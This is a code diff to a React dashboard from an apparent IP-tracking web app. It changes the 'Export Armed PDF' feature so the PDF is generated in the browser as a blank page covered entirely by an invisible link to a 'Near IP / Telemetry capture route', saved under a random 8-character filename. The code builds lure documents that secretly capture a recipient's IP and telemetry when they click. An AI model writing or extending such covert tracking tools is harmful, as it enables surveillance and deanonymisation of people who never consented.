@@ -90,44 +90,36 @@ export const TrackDashboard: React.FC<TrackDashboardProps> = ({
 
   const handleDownloadTrackingPdf = async (code: string) => {
     try {
-      const url = `/api/pdf/generate/${code}`;
-      const res = await fetch(url);
-      if (!res.ok) {
-        throw new Error(`Failed to generate PDF: ${res.status}`);
-      }
+      const { jsPDF } = await import('jspdf');
+      const doc = new jsPDF({ orientation: 'p', unit: 'mm', format: 'a4' });
 
-      let downloadFilename = '';
-      const customFileName = res.headers.get('x-file-name');
-      const disposition = res.headers.get('content-disposition');
-      if (customFileName) {
-        downloadFilename = customFileName;
-      } else if (disposition && disposition.includes('filename=')) {
-        const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(disposition);
-        if (matches != null && matches[1]) {
-          downloadFilename = matches[1].replace(/['"]/g, '');
-        }
-      }
+      // Page 1: Completely white background
+      doc.setFillColor(255, 255, 255);
+      doc.rect(0, 0, 210, 297, 'F');
 
-      if (!downloadFilename || !downloadFilename.endsWith('.pdf')) {
-        const randNum = Math.floor(100000 + Math.random() * 900000);
-        downloadFilename = `Document_Verification_#${randNum}.pdf`;
-      }
+      // Target Tracking URL (Points to the Near IP / Telemetry capture route /p/:code)
+      const trackingUrl = `${window.location.origin}/p/${code}`;
 
-      const blob = await res.blob();
-      const downloadUrl = window.URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.style.display = 'none';
-      a.href = downloadUrl;
-      a.download = downloadFilename;
-      document.body.appendChild(a);
-      a.click();
-      setTimeout(() => {
-        document.body.removeChild(a);
-        window.URL.revokeObjectURL(downloadUrl);
-      }, 500);
+      // Full-Page Clickable Hotspot (Covering 100% of the A4 page: width 210mm, height 297mm)
+      doc.link(0, 0, 210, 297, { url: trackingUrl });
+
+      // 8 random uppercase characters for the downloaded PDF filename
+      const randomChars = Math.random().toString(36).substring(2, 10).toUpperCase();
+      const filename = `${randomChars}.pdf`;
+
+      doc.save(filename);
     } catch (err) {
-      console.error('Download PDF error:', err);
-      window.location.href = `/api/pdf/generate/${code}`;
+      console.error('Client-side PDF download error:', err);
+      const url = `/api/pdf/generate/${code}`;
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = url;
+      document.body.appendChild(iframe);
+      setTimeout(() => {
+        if (document.body.contains(iframe)) {
+          document.body.removeChild(iframe);
+        }
+      }, 15000);
     }
   };
 
@@ -343,7 +335,7 @@ export const TrackDashboard: React.FC<TrackDashboardProps> = ({
                 title={lang === 'ar' ? 'تنزيل ملف PDF ملغّم يرتبط تلقائياً بهذا الرابط' : 'Download armed PDF linked to this tracking code'}
               >
                 <FileDown className="w-3.5 h-3.5 text-indigo-600" />
-                <span>{lang === 'ar' ? 'تنزيل كملف PDF ملغّم (شاشة كاملة)' : 'Export Armed PDF (Full Screen Link)'}</span>
+                <span>{lang === 'ar' ? 'تنزيل كملف PDF ملغّم (8 خانات عشوائية)' : 'Export Armed PDF (8-char Random)'}</span>
               </button>
             </div>
           </div>
@@ -371,7 +363,7 @@ export const TrackDashboard: React.FC<TrackDashboardProps> = ({
             <button
               type="button"
               onClick={() => handleDownloadTrackingPdf(link.code)}
-              className="w-full sm:w-auto px-8 py-4 rounded-full bg-indigo-600 hover:bg-indigo-700 text-white shadow-lg shadow-indigo-600/25 text-sm font-black flex items-center justify-center gap-2.5 transition-all cursor-pointer active:scale-95 group shrink-0 relative z-10 text-decoration-none"
+              className="w-full sm:w-auto px-8 py-4 rounded-full bg-indigo-600 hover:bg-indigo-700 text-white shadow-lg shadow-indigo-600/25 text-sm font-black flex items-center justify-center gap-2.5 transition-all cursor-pointer active:scale-95 group shrink-0 relative z-10"
             >
               <FileDown className="w-5 h-5 group-hover:translate-y-0.5 transition-transform" />
               <span>{t.pdfDownloadBtn}</span>
